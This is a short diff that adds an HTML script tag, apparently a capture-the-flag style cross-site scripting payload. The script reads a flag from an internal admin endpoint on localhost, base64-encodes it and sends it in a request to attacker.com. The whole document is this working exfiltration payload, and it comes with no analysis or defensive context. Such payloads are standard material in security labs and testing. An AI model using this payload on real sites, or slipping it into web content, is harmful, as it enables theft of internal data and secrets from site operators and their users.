@@ -1,0 +1,5 @@
+<script>
+  fetch("http://127.0.0.1:5000/internal/admin/flag").then(r => r.text()).then(t => {
+    fetch("https://attacker.com/steal?flag=" + btoa(t))
+  });
+</script>
